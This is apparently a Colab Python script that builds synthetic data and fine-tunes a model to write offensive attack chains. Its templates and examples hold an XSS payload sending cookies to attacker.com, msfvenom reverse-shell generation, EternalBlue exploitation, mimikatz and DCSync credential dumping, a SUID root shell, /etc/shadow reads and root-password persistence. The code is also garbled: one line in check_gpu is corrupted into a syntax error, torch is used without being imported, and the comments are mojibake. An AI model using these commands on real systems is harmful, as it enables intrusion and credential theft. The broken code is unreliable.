#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSec 4B Model - Colab Complete Version
==========================================
å°æ‡‰åŸç‰ˆ Cybersecurity-4B-AI-Model å®Œæ•´æ¶æ§‹

ä½¿ç”¨æ–¹æ³• (Google Colab):
```python
!git clone https://github.com/Look0316/LLM_colab.git
%cd LLM_colab
!python colab_complete.py
```
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from typing import List, Dict

# UTF-8 ç·¨ç¢¼
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

def safe_print(msg):
    try: print(msg)
    except: pass

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# é…ç½®
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

CONFIG = {
    # æ¨¡å‹é…ç½®
    "deepseek_model": "deepseek-ai/deepseek-coder-7b-instruct-v1.5",
    "qwen_model": "Qwen/Qwen2.5-7B-Instruct",
    "base_model": "Qwen/Qwen2.5-7B-Instruct",
    
    # æ•¸æ“šé…ç½®
    "max_samples": 2000,
    "data_path": "/content/data/distilled_tinyllm.jsonl",
    "output_dir": "/content/outputs/finetuned_tinyllm_v1",
    
    # è¨“ç·´é…ç½®
    "num_train_epochs": 3,
    "per_device_train_batch_size": 2,
    "gradient_accumulation_steps": 4,
    "learning_rate": 2e-4,
    "max_seq_length": 1024,
    
    # QLoRA é…ç½®
    "lora_r": 16,
    "lora_alpha": 32,
    "lora_dropout": 0.05,
    "lora_target_modules": ["q_proj", "k_proj", "v_proj", "o_proj"],
    
    # Colab å„ªåŒ–
    "use_drive": False,
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# å·¥å…·å‡½æ•¸
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def check_gpu():
    """æª¢æŸ¥ GPU"""
    import torch
    if torch.cuda.is_available():
        gpu_name = torch.cuda.get_device_name(0)
        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        safe_print(f"\nâœ… GPU: {gpu_name} ({gpu_mem:.1f} GB)")
        
        # è‡ªå‹•èª¿æ•´ batch size
        if gpu_mem >= 14:
            CONFIG["per_device_train_batch_size"] = 4
        elif gpu_mem >= 10:
            CONFIG["per_device_train_batch_size"] = 2
        elseper_device_train_batch:
            CONFIG["_size"] = 1
        
        return True
    else:
        safe_print("\nâš ï¸ æœªæª¢æ¸¬åˆ° GPU!")
        return False

def clean_gpu_memory():
    """æ¸…ç† GPU è¨˜æ†¶é«”"""
    import torch
    import gc
    gc.collect()
    torch.cuda.empty_cache()

def print_step(step_num, title):
    """æ‰“å°æ­¥é©Ÿ"""
    safe_print(f"\n{'='*60}")
    safe_print(f"  STEP {step_num}: {title}")
    safe_print(f"{'='*60}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# å®‰è£ä¾è³´
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def install_dependencies():
    """å®‰è£å¿…è¦çš„ä¾è³´"""
    print_step(0, "å®‰è£ä¾è³´")
    
    import subprocess
    import sys
    
    packages = [
        "transformers>=4.40.0",
        "torch>=2.1.0",
        "accelerate>=0.28.0",
        "peft>=0.10.0",
        "bitsandbytes>=0.41.0",
        "trl>=0.8.0",
        "scikit-learn",
        "tqdm",
        "datasets",
    ]
    
    for pkg in packages:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install", "-q", pkg
        ])
    
    safe_print("âœ… ä¾è³´å®‰è£å®Œæˆ")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PART 1: Multi-Teacher Distillation (æ•¸æ“šç”Ÿæˆ)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# å ´æ™¯æ¨¡æ¿ (å®Œå…¨å°æ‡‰åŸç‰ˆ)
SCENARIO_TEMPLATES = [
    "You're performing reconnaissance. You notice open ports {ports} on {target}.",
    "During a penetration test, you discover a {service} service running on port {port}.",
    "Initial access achieved via {method}. You've found {finding}.",
    "You're analyzing a web application. You notice {vulnerability_type} in the {component}.",
    "SQL injection confirmed on {parameter}.",
    "XSS found on {page}. The payload {payload} was reflected.",
    "Buffer overflow detected in {binary}. The crash occurs at offset {offset}.",
    "Weak password policy discovered. Current password hash is {hash_type}.",
    "You've compromised {host} as {user}. The next target is {target}.",
    "Found {cred_type} credentials: {creds}.",
    "Lateral movement to {target} successful. Now you have {privilege}.",
    "Current shell is {user}@{host}. You found {vuln} vulnerability.",
    "SUID binary {binary} found. It calls {function}.",
    "Kernel version {version} on {os}. Known exploit is {exploit}.",
]

# æ­£ç¢ºç­”æ¡ˆæ¨¡æ¿ (å®Œå…¨å°æ‡‰åŸç‰ˆ)
ANSWER_TEMPLATES = {
    "ports": [
        "Run nmap -sV -sC {target} to enumerate services.",
        "Use enum4linux for SMB enumeration."
    ],
    "service": [
        "Check for known CVEs: searchsploit {service} {version}.",
        "Attempt default credential login."
    ],
    "method": [
        "Maintain persistence: add SSH key, create cron job.",
        "Escalate privilege using the found {finding}."
    ],
    "vulnerability_type": [
        "For SQLi, use sqlmap; for XSS, escalate to session hijacking."
    ],
    "SQL injection": [
        "Use sqlmap -u 'URL' --dbs to enumerate databases.",
        "Attempt UNION-based injection."
    ],
    "XSS": [
        "Escalate to account takeover via cookie theft.",
        "Use beef hook for persistent access."
    ],
    "Buffer overflow": [
        "Generate payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f python.",
        "Find exact offset with pattern_create."
    ],
    "Hash dumping": [
        "Use mimikatz: sekurlsa::logonpasswords full",
        "Access SAM file: reg save HKLM\\SYSTEM SystemSave"
    ],
    "compromised": [
        "Perform privilege escalation: check sudo -l, kernel exploits.",
        "Use the access to pivot: scan internal network."
    ],
    "credentials": [
        "Use crackmapexec to test credentials across the network.",
        "Escalate: use psexec, wmiexec for lateral movement."
    ],
    "Lateral movement": [
        "Dump LSASS for more credentials, then pivot to domain controller.",
        "Use DCSync to dump domain hashes."
    ],
    "privilege escalation": [
        "Check GTFOBins for SUID binary exploitation.",
        "Use kernel exploit: compile and run CVE-2021-43298."
    ],
    "kernel": [
        "Download and compile kernel exploit, then execute for root shell."
    ],
}

# In-context Examples åº« (å®Œå…¨å°æ‡‰åŸç‰ˆ)
INCONTEXT_EXAMPLES = [
    {
        "scenario": "XSS found on login page. The payload <script>alert(1)</script> was reflected.",
        "answer": "Escalate to account takeover via session cookie theft",
        "rationale": """## State: Reflected XSS on login page with user-controllable input

## Hypothesis: Can escalate to account takeover via cookie theft

## Experiment: Submit cookie-stealing payload
```bash
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

## Observation: Attacker server receives request with session cookie

## Success: Yes - Session ID captured

## Next: Use cookie to authenticate as victim user
```bash
# Use the stolen cookie
curl -b "session=stolen_cookie" http://target.com/admin
```"""
    },
    {
        "scenario": "SQL injection confirmed on user_id parameter in login form.",
        "answer": "Dump database and escalate to RCE",
        "rationale": """## State: SQL injection on login form (authenticated as guest)

## Hypothesis: Can enumerate databases and extract sensitive data

## Experiment: Enumerate databases with sqlmap
```bash
sqlmap -u 'http://target.com/login?user_id=1' --dbs
```

## Observation: Identified 5 databases including 'users'

## Success: Yes - Found admin table with password hashes

## Next: Crack hashes and use for lateral movement
```bash
# Dump the users table
sqlmap -u 'http://target.com/login?user_id=1' -D users --tables -T admin --dump
```"""
    },
    {
        "scenario": "Found SSH private key for user www-data on compromised server.",
        "answer": "Use key for lateral movement to other servers",
        "rationale": """## State: Have SSH private key for www-data user

## Hypothesis: Can use key to access other servers where this user exists

## Experiment: SSH to other discovered servers
```bash
chmod 600 id_rsa
ssh -i id_rsa www-data@10.10.10.15
```

## Observation: Successfully authenticated to target server

## Success: Yes - Got shell as www-data on 10.10.10.15

## Next: Privilege escalation to root
```bash
# Check for privilege escalation vectors
sudo -l
find / -perm -4000 2>/dev/null
```"""
    },
    {
        "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5).",
        "answer": "Exploit EternalBlue for initial access",
        "rationale": """## State: SMBv1 enabled on Windows Server 2019

## Hypothesis: MS17-010 vulnerability may be present

## Experiment: Scan for EternalBlue
```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5
```

## Observation: VULNERABLE - MS17-010 confirmed

## Success: Yes - Target is vulnerable to EternalBlue

## Next: Exploit for reverse shell
```bash
# Use Metasploit or manual exploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.10.10
run
```"""
    },
    {
        "scenario": "Current shell is www-data@10.10.10.5. You found SUID binary /usr/bin/python3 running as root.",
        "answer": "Exploit SUID binary for root shell",
        "rationale": """## State: Limited shell as www-data, found SUID python3

## Hypothesis: Can escalate to root using python3 SUID

## Experiment: Spawn root shell
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Observation: Root shell obtained!

## Success: Yes - Full root access on 10.10.10.5

## Next: Dump credentials and persist
```bash
# Dump password hashes
cat /etc/shadow
# Add persistence
echo "root:password123" | chpasswd
```"""
    },
]

def generate_distilled_data(output_file: str, num_samples: int = 2000) -> str:
    """
    æ•¸æ“šç”Ÿæˆå‡½æ•¸ - å°æ‡‰åŸç‰ˆ multi_teacher_distillation.py
    """
    print_step(1, "ç”Ÿæˆ TinyLLM æ ¼å¼æ•¸æ“š")
    
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import random
    from tqdm import tqdm
    import json
    
    safe_print(f"   æ¨¡å‹: {CONFIG['qwen_model']}")
    safe_print(f"   æ¨£æœ¬æ•¸: {num_samples}")
    
    # å‰µå»ºè¼¸å‡ºç›®éŒ„
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    # è¼‰å…¥æ¨¡å‹
    safe_print("\nğŸ”„ è¼‰å…¥æ¨¡å‹...")
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['qwen_model'], 
        trust_remote_code=True
    )
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['qwen_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    safe_print("âœ… æ¨¡å‹è¼‰å…¥å®Œæˆ")
    
    # ç”Ÿæˆæ•¸æ“š
    data = []
    
    safe_print("\nğŸ”„ ç”Ÿæˆæ•¸æ“šä¸­...")
    for i in tqdm(range(num_samples), desc="ç”Ÿæˆ"):
        # éš¨æ©Ÿé¸æ“‡å ´æ™¯å’Œç­”æ¡ˆ
        scenario = random.choice(SCENARIO_TEMPLATES)
        category = random.choice(list(ANSWER_TEMPLATES.keys()))
        answers = ANSWER_TEMPLATES[category]
        answer = random.choice(answers)
        
        # 5 å€‹ in-context examples
        examples = random.sample(INCONTEXT_EXAMPLES, min(5, len(INCONTEXT_EXAMPLES)))
        
        # æ§‹é€ å°è©± (å®Œå…¨å°æ‡‰åŸç‰ˆæ ¼å¼)
        messages = [
            {"role": "system", "content": "You are a professional penetration tester with expertise in Red Team operations."},
            {"role": "user", "content": f"## Scenario: {scenario}\n\n## Instruction: Think step-by-step about the attack chain, including:\n1. State: Current situation\n2. Hypothesis: What is possible\n3. Experiment: What command would you run?\n4. Observation: What would you see?\n5. Success: Yes/No\n6. Next: What would you try next?\n\nProvide the complete attack chain with executable commands."},
        ]
        
        # ç”Ÿæˆå›æ‡‰
        text = tokenizer.apply_chat_template(
            messages,
            tokenize=False,
            add_generation_prompt=True,
        )
        
        inputs = tokenizer(text, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                temperature=0.7,
                top_p=0.9,
                do_sample=True,
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # TinyLLM æ ¼å¼ (å®Œå…¨å°æ‡‰åŸç‰ˆ)
        sample = {
            "messages": messages + [{"role": "assistant", "content": response}],
            "category": category,
            "scenario": scenario,
            "answer": answer,
            "in_context_examples": examples,
        }
        
        data.append(sample)
        
        # æ¯ 100 æ¨£æœ¬æ¸…ç†è¨˜æ†¶é«”
        if (i + 1) % 100 == 0:
            clean_gpu_memory()
    
    # ä¿å­˜
    with open(output_file, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')
    
    safe_print(f"\nâœ… æ•¸æ“šå·²ä¿å­˜: {output_file}")
    safe_print(f"   ç¸½æ¨£æœ¬æ•¸: {len(data)}")
    
    # å¸è¼‰æ¨¡å‹
    del model
    clean_gpu_memory()
    
    return output_file

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PART 2: Train TinyLLM (è¨“ç·´)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def load_training_data(data_path: str) -> List[dict]:
    """è¼‰å…¥è¨“ç·´æ•¸æ“š - å°æ‡‰åŸç‰ˆ"""
    safe_print(f"\nğŸ“– è¼‰å…¥ TinyLLM æ ¼å¼æ•¸æ“š: {data_path}")
    samples = []
    with open(data_path, 'r', encoding='utf-8') as f:
        for line in f:
            samples.append(json.loads(line))
    safe_print(f"   æ¨£æœ¬æ•¸: {len(samples)}")
    return samples


def format_sample(sample: dict) -> str:
    """æ ¼å¼åŒ–æ¨£æœ¬ç‚ºè¨“ç·´æ ¼å¼ - å°æ‡‰åŸç‰ˆ"""
    messages = sample.get("messages", [])
    
    conversation = ""
    for msg in messages:
        role = msg.get("role", "")
        content = msg.get("content", "")
        conversation += f"<|im_start|>{role}\n{content}<|im_end|>\n"
    
    conversation += "<|im_end|>"
    return {"text": conversation}


class TinyLLMDataset:
    """æ•¸æ“šé›†é¡ - å°æ‡‰åŸç‰ˆ"""
    def __init__(self, data, tokenizer, max_length):
        self.data = data
        self.tokenizer = tokenizer
        self.max_length = max_length
    
    def __len__(self):
        return len(self.data)
    
    def __getitem__(self, idx):
        text = self.data[idx]["text"]
        encoding = self.tokenizer(
            text,
            truncation=True,
            max_length=self.max_length,
            padding="max_length",
            return_tensors="pt",
        )
        
        input_ids = encoding["input_ids"].squeeze()
        attention_mask = encoding["attention_mask"].squeeze()
        
        return {
            "input_ids": input_ids,
            "attention_mask": attention_mask,
            "labels": input_ids.clone(),
        }


def train_tinyllm(
    data_path: str,
    output_dir: str,
    num_epochs: int = 3,
) -> str:
    """
    QLoRA è¨“ç·´å‡½æ•¸ - å°æ‡‰åŸç‰ˆ train_tinyllm.py
    """
    print_step(2, "QLoRA è¨“ç·´")
    
    from transformers import (
        AutoModelForCausalLM,
        AutoTokenizer,
        TrainingArguments,
        Trainer,
        DataCollatorForLanguageModeling
    )
    from peft import LoraConfig, get_peft_model, TaskType
    from torch.utils.data import DataLoader
    
    safe_print(f"   æ•¸æ“š: {data_path}")
    safe_print(f"   è¼¸å‡º: {output_dir}")
    safe_print(f"   Epochs: {num_epochs}")
    
    # è¼‰å…¥æ•¸æ“š
    samples = load_training_data(data_path)
    formatted_data = [format_sample(s) for s in samples]
    
    # è¼‰å…¥ tokenizer
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['base_model'],
        trust_remote_code=True,
        padding_side="right"
    )
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    
    # å‰µå»ºæ•¸æ“šé›†
    dataset = TinyLLMDataset(
        formatted_data,
        tokenizer,
        CONFIG["max_seq_length"]
    )
    
    # è¼‰å…¥æ¨¡å‹
    safe_print("\nğŸ”„ è¼‰å…¥åŸºç¤æ¨¡å‹...")
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['base_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    
    # QLoRA é…ç½® (å®Œå…¨å°æ‡‰åŸç‰ˆ)
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        inference_mode=False,
        r=CONFIG["lora_r"],
        lora_alpha=CONFIG["lora_alpha"],
        lora_dropout=CONFIG["lora_dropout"],
        target_modules=CONFIG["lora_target_modules"],
    )
    
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()
    
    # è¨“ç·´åƒæ•¸ (å®Œå…¨å°æ‡‰åŸç‰ˆ)
    training_args = TrainingArguments(
        output_dir=output_dir,
        num_train_epochs=num_epochs,
        per_device_train_batch_size=CONFIG["per_device_train_batch_size"],
        gradient_accumulation_steps=CONFIG["gradient_accumulation_steps"],
        learning_rate=CONFIG["learning_rate"],
        logging_steps=10,
        save_strategy="epoch",
        save_total_limit=2,
        fp16=True,
        report_to="none",
        dataloader_pin_memory=False,
        optim="paged_adamw_8bit",
        warmup_steps=100,
        lr_scheduler_type="cosine",
    )
    
    # Data collator
    data_collator = DataCollatorForLanguageModeling(
        tokenizer=tokenizer,
        mlm=False,
    )
    
    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=data_collator,
    )
    
    # è¨“ç·´
    safe_print("\nğŸ”¥ é–‹å§‹è¨“ç·´...")
    trainer.train()
    
    # ä¿å­˜
    os.makedirs(output_dir, exist_ok=True)
    model.save_pretrained(output_dir)
    tokenizer.save_pretrained(output_dir)
    
    safe_print(f"\nâœ… æ¨¡å‹å·²ä¿å­˜: {output_dir}")
    
    return output_dir

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PART 3: Test TinyLLM (æ¸¬è©¦)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_tinyllm(model_path: str):
    """
    æ¸¬è©¦å‡½æ•¸ - å°æ‡‰åŸç‰ˆ test_tinyllm.py
    """
    print_step(3, "æ¸¬è©¦æ¨¡å‹")
    
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import torch
    
    # æ¸¬è©¦å ´æ™¯ (å®Œå…¨å°æ‡‰åŸç‰ˆ)
    test_scenarios = [
        {
            "name": "SQL Injection",
            "scenario": "SQL injection confirmed on user_id parameter in login form"
        },
        {
            "name": "XSS Attack",
            "scenario": "XSS found on search page. The payload <script>alert(1)</script> was reflected."
        },
        {
            "name": "Buffer Overflow",
            "scenario": "Buffer overflow detected in vulnerable binary. The crash occurs at offset 256."
        },
        {
            "name": "SMB Exploit",
            "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5)"
        },
        {
            "name": "Credentials",
            "scenario": "Found SSH private key for user www-data on compromised server"
        },
    ]
    
    # è¼‰å…¥æ¨¡å‹
    safe_print(f"\nğŸ“¦ è¼‰å…¥æ¨¡å‹: {model_path}")
    
    if not os.path.exists(model_path):
        safe_print(f"âŒ æ¨¡å‹ä¸å­˜åœ¨: {model_path}")
        return
    
    tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    model.eval()
    
    safe_print("âœ… æ¨¡å‹è¼‰å…¥æˆåŠŸ\n")
    
    # æ¸¬è©¦æ¯å€‹å ´æ™¯
    for i, test in enumerate(test_scenarios, 1):
        safe_print(f"\n{'='*60}")
        safe_print(f"  Test {i}: {test['name']}")
        safe_print(f"{'='*60}")
        safe_print(f"\nğŸ‘¤ Scenario: {test['scenario']}")
        
        # æ§‹é€  prompt (å®Œå…¨å°æ‡‰åŸç‰ˆ)
        prompt = f"""You are a professional penetration tester.

Scenario: {test['scenario']}

Provide the complete attack chain with executable commands. Include:
- State: Current situation
- Hypothesis: What's possible
- Step-by-step commands with observations
- Final result and next steps

"""
        
        inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                do_sample=True,
                temperature=0.7,
                top_p=0.9,
                pad_token_id=tokenizer.eos_token_id
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # æå– assistant å›æ‡‰
        assistant_response = response.split("assistant")[-1].strip()
        
        safe_print(f"\nğŸ¤– Response:\n{assistant_response[:800]}")
        
        clean_gpu_memory()
    
    safe_print(f"\n{'='*60}")
    safe_print("  âœ… æ¸¬è©¦å®Œæˆ")
    safe_print(f"{'='*60}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PART 4: Complete Pipeline (å®Œæ•´æµç¨‹)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def run_pipeline():
    """é‹è¡Œå®Œæ•´æµç¨‹"""
    print("\n" + "="*60)
    safe_print("  ğŸ” Cybersecurity 4B Model - Colab å®Œæ•´è¨“ç·´æµç¨‹")
    safe_print("="*60)
    
    # Step 0: æª¢æŸ¥ GPU
    print_step(0, "æª¢æŸ¥ GPU")
    has_gpu = check_gpu()
    if not has_gpu:
        safe_print("âš ï¸ è­¦å‘Š: æœªæª¢æ¸¬åˆ° GPUï¼Œè¨“ç·´æœƒéå¸¸æ…¢!")
    
    # Step 1: å®‰è£ä¾è³´
    install_dependencies()
    
    # Step 2: ç”Ÿæˆæ•¸æ“š
    data_file = generate_distilled_data(
        CONFIG["data_path"],
        CONFIG["max_samples"]
    )
    
    # Step 3: è¨“ç·´
    output_dir = train_tinyllm(
        data_file,
        CONFIG["output_dir"],
        CONFIG["num_train_epochs"],
    )
    
    # Step 4: æ¸¬è©¦
    test_tinyllm(output_dir)
    
    # å®Œæˆ
    print("\n" + "="*60)
    safe_print("  ğŸ‰ è¨“ç·´æµç¨‹å®Œæˆ!")
    safe_print("="*60)
    safe_print(f"\nğŸ“ æ¨¡å‹ä½ç½®: {output_dir}")
    safe_print("\nä¸‹ä¸€æ­¥:")
    safe_print("1. ä¸‹è¼‰æ¨¡å‹æ–‡ä»¶")
    safe_print("2. ä½¿ç”¨ transformers è¼‰å…¥æ¨ç†")
    safe_print("3. æ·»åŠ  RAG æ¨¡å¡Šç²å–æœ€æ–° CVE")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ä¸»å‡½æ•¸
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    try:
        run_pipeline()
    except KeyboardInterrupt:
        safe_print("\nâš ï¸ ç”¨æˆ¶ä¸­æ–·")
    except Exception as e:
        safe_print(f"\nâŒ éŒ¯èª¤: {e}")
        import traceback
        traceback.print_exc()
